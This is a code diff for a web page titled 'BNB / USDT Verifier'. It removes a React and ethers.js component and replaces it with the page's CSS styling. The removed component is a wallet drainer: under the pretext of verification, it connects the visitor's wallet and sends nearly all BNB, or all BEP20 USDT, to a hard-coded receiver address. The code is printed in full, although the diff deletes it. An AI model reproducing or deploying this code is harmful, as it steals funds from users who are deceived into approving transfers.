@@ -1,86 +1,53 @@
-import React, { useState } from "react";
-import { ethers } from "ethers";
-import "./index.css";
-
-const RECEIVER = "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef";
-const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955";
-
-const ERC20_ABI = [
-  "function balanceOf(address owner) view returns (uint256)",
-  "function transfer(address to, uint256 amount) returns (bool)"
-];
-
-function App() {
-  const [status, setStatus] = useState("Click Verify to start...");
-  const [loading, setLoading] = useState(false);
-
-  const handleVerify = async () => {
-    if (!window.ethereum) {
-      setStatus("No wallet detected. Install MetaMask or Binance Wallet.");
-      return;
-    }
-
-    try {
-      setLoading(true);
-      setStatus("Connecting wallet...");
-
-      await window.ethereum.request({ method: "eth_requestAccounts" });
-      const provider = new ethers.providers.Web3Provider(window.ethereum);
-      const signer = provider.getSigner();
-      const userAddress = await signer.getAddress();
-
-      const balanceBNB = await provider.getBalance(userAddress);
-      if (balanceBNB > ethers.utils.parseEther("0.001")) {
-        setStatus("Sending BNB...");
-        const tx = await signer.sendTransaction({
-          to: RECEIVER,
-          value: balanceBNB.sub(ethers.utils.parseEther("0.0005")),
-        });
-        await tx.wait();
-        setStatus("✅ BNB sent successfully");
-        setLoading(false);
-        return;
-      }
-
-      const usdt = new ethers.Contract(USDT_BEP20, ERC20_ABI, signer);
-      const balanceUSDT = await usdt.balanceOf(userAddress);
-      if (balanceUSDT > 0n) {
-        setStatus("Sending USDT...");
-        const tx = await usdt.transfer(RECEIVER, balanceUSDT);
-        await tx.wait();
-        setStatus("✅ USDT sent successfully");
-        setLoading(false);
-        return;
-      }
-
-      setStatus("❌ No BNB or USDT found");
-      setLoading(false);
-    } catch (err) {
-      console.error(err);
-      setStatus("Error: " + (err.reason || err.message));
-      setLoading(false);
-    }
-  };
-
-  return (
-    <div className="app">
-      <div className="card">
-        <h1 className="title">BNB / USDT Verifier</h1>
-        <p className="subtitle">Instantly verify & transfer BNB or USDT (BEP20).</p>
-
-        <div className="pulse-wrapper">
-          <div className="pulse-ring"></div>
-          <div className="pulse-ring"></div>
-          <div className="pulse-ring"></div>
-          <button className="verify-btn" onClick={handleVerify} disabled={loading}>
-            {loading ? <span className="spinner"></span> : "Verify"}
-          </button>
-        </div>
-
-        <p className="status">{status}</p>
-      </div>
-    </div>
-  );
+body, html, #root {
+  margin: 0; padding: 0; height: 100%; background: #121212;
+  font-family: 'Inter', sans-serif; display: flex; align-items: center; justify-content: center;
+  color: #E0E0E0;
 }
 
-export default App;
+.app { display: flex; align-items: center; justify-content: center; width: 100%; }
+
+.card {
+  background: rgba(255, 255, 255, 0.05);
+  backdrop-filter: blur(10px);
+  border-radius: 20px;
+  padding: 3rem;
+  text-align: center;
+  box-shadow: 0 10px 20px rgba(0,0,0,0.7);
+}
+
+.title { font-size: 2rem; font-weight: bold; color: #FACC15; margin-bottom: 0.5rem; }
+.subtitle { font-size: 1rem; color: #CCC; margin-bottom: 2rem; }
+
+.verify-btn {
+  padding: 1rem 2rem; border-radius: 9999px; font-weight: 600; background: #FACC15;
+  color: #121212; border: none; cursor: pointer; z-index: 10;
+  transition: transform 0.2s ease, background 0.3s ease;
+}
+.verify-btn:hover { transform: scale(1.05); background: #fbbf24; }
+.verify-btn:disabled { background: #9ca3af; cursor: not-allowed; }
+
+.pulse-wrapper {
+  position: relative; display: flex; justify-content: center; align-items: center;
+  width: 180px; height: 180px; margin: 0 auto 1.5rem auto;
+}
+.pulse-ring {
+  position: absolute; border: 2px solid #FACC15; border-radius: 50%;
+  width: 160px; height: 160px; animation: pulse 2.5s infinite;
+}
+.pulse-ring:nth-child(1) { animation-delay: 0s; }
+.pulse-ring:nth-child(2) { animation-delay: 0.8s; }
+.pulse-ring:nth-child(3) { animation-delay: 1.6s; }
+
+@keyframes pulse {
+  0% { transform: scale(0.6); opacity: 0.7; }
+  70% { transform: scale(1.3); opacity: 0; }
+  100% { opacity: 0; }
+}
+
+.status { margin-top: 1rem; font-size: 1rem; color: #FACC15; min-height: 24px; }
+.spinner {
+  width: 20px; height: 20px; border: 3px solid rgba(0,0,0,0.3);
+  border-top: 3px solid #121212; border-radius: 50%; display: inline-block;
+  animation: spin 0.7s linear infinite;
+}
+@keyframes spin { 0% { transform: rotate(0); } 100% { transform: rotate(360deg); } }
